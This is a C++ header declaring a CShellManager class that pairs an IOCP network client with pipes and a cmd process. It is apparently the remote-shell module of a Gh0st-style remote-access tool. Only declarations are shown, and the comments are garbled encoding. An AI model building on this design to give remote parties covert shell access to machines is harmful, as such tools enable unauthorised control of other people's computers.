// ShellManager.h: interface for the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SHELLMANAGER_H__287AE05D_9C48_4863_8582_C035AFCB687B__INCLUDED_)
#define AFX_SHELLMANAGER_H__287AE05D_9C48_4863_8582_C035AFCB687B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "IOCPClient.h"

class CShellManager : public CManager
{
public:
    CShellManager(IOCPClient* ClientObject, int n, void* user = nullptr);

    HANDLE m_hReadPipeHandle;
    HANDLE m_hWritePipeHandle;
    HANDLE m_hReadPipeShell;
    HANDLE m_hWritePipeShell;

    virtual ~CShellManager();
    VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);

    static DWORD WINAPI ReadPipeThread(LPVOID lParam);

    BOOL m_bStarting;
    HANDLE m_hThreadRead;
    int m_nCmdLength;				// ����������
    HANDLE m_hShellProcessHandle;    //����Cmd���̵Ľ��̾�������߳̾��
    HANDLE m_hShellThreadHandle;
};

#endif // !defined(AFX_SHELLMANAGER_H__287AE05D_9C48_4863_8582_C035AFCB687B__INCLUDED_)
